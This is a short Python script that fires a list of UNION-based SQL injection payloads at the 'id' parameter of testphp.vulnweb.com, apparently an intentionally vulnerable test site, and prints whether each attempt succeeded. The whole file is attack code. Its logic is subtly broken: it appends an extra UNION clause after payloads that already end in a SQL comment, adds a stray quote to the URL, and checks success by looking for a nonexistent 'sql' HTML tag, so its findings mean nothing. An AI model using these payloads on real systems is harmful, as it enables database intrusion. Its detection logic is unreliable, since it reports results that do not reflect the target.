import requests
from bs4 import BeautifulSoup

def test_sql_injection(url):
    # Define a list of common database query keywords to use in the UNION SELECT attack
    query_keywords = ['SELECT', 'FROM', 'WHERE', 'JOIN', 'LIMIT']

    # Define a list of payloads to test for the UNION BASED SQL injection vulnerability
    payloads = [
        "1' UNION SELECT NULL, NULL--",
        "1' UNION SELECT 'a', NULL--",
        "1' UNION SELECT NULL, 'a'--",
        "1' UNION SELECT 'a', 'a'--",
        "1' UNION SELECT 'a', 'b'--",
        "1' UNION SELECT 'a', 'c'--",
        "1' UNION SELECT 'a', 'd'--",
        "1' UNION SELECT 'a', 'e'--",
        "1' UNION SELECT 'a', 'f'--",
        "1' UNION SELECT 'a', 'g'--",
        "1' UNION SELECT 'a', 'h'--",
        "1' UNION SELECT 'a', 'i'--",
        "1' UNION SELECT 'a', 'j'--",
        "1' UNION SELECT 'a', 'k'--",
        "1' UNION SELECT 'a', 'l'--",
        "1' UNION SELECT 'a', 'm'--",
        "1' UNION SELECT 'a', 'n'--",
        "1' UNION SELECT 'a', 'o'--",
        "1' UNION SELECT 'a', 'p'--",
        "1' UNION SELECT 'a', 'q'--",
        "1' UNION SELECT 'a', 'r'--",
        "1' UNION SELECT 'a', 's'--",
        "1' UNION SELECT 'a', 't'--",
        "1' UNION SELECT 'a', 'u'--",
        "1' UNION SELECT 'a', 'v'--",
        "1' UNION SELECT 'a', 'w'--",
        "1' UNION SELECT 'a', 'x'--",
        "1' UNION SELECT 'a', 'y'--",
        "1' UNION SELECT 'a', 'z'--",
    ]

    # Add a single quote to the end of the URL to test for SQL injection
    url_injection = url + "'"

    # Loop over the payloads and query keywords to create a UNION SELECT payload
    for payload in payloads:
        for keyword in query_keywords:
            union_payload = f"{payload} UNION SELECT {keyword}, NULL"

            # Make an HTTP GET request with the injection and UNION SELECT payload
            r = requests.get(url_injection, params={'id': union_payload})

            # Check the response for signs of a successful SQL injection attack
            soup = BeautifulSoup(r.text, 'html.parser')
            if soup.find('sql', text='error'):
                print(f"SQL injection vulnerability detected with keyword: {keyword}, payload: {payload}")
            else:
                print(f"No SQL injection vulnerabilities detected with keyword: {keyword}, payload: {payload}")


url='http://testphp.vulnweb.com/categories.php'

test_sql_injection(url)
